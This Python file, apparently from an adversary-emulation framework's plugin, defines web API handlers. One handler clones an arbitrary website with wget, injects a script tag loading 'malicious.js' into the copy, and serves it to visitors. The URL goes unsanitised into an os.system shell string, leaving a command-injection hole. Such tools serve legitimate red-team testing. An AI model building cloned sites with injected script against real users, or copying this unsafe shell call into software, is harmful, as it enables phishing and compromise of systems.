import os
import shutil

from aiohttp import web
from aiohttp_jinja2 import template


class SandGuiApi:

    def __init__(self, services):
        self.auth_svc = services.get('auth_svc')
        self.plugin_svc = services.get('plugin_svc')

    @template('sandcat.html')
    async def splash(self, request):
        await self.auth_svc.check_permissions(request)
        plugins = [dict(name=getattr(p, 'name'), address=getattr(p, 'address')) for p in self.plugin_svc.get_plugins()]
        return dict(plugins=plugins)

    @staticmethod
    async def malicious(request):
        return web.HTTPFound('/malicious/index.html')

    async def clone_new_site(self, request):
        await self.auth_svc.check_permissions(request)
        url = request.rel_url.query['url']
        location = 'plugins/sandcat/static/malicious/'
        shutil.rmtree(location, ignore_errors=True)
        os.system("""wget -U 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' -E -H -k -K -p -q -nH --cut-dirs=1 %s --directory %s --no-check-certificate""" % (url, location))
        self.auth_svc.prepend_to_file('%s/index.html' % location, '<script src="/sandcat/js/malicious.js"></script>')
        self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Expires" content="0">')
        self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Pragma" content="no-cache">')
        self.auth_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">')
        return web.Response()
